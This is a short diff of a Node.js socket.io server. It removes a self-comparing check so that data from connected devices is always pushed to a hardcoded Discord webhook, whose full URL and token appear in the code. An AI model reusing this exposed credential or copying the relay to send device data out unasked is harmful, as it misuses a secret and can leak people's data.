@@ -88,7 +88,7 @@ io.on('connection', (socket) => {
         
         // Push payload to Discord Webhook
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8"; 
-        if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8" && !data.error) {
+        if (!data.error) {
             try {
                 // Find device ID for context
                 const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
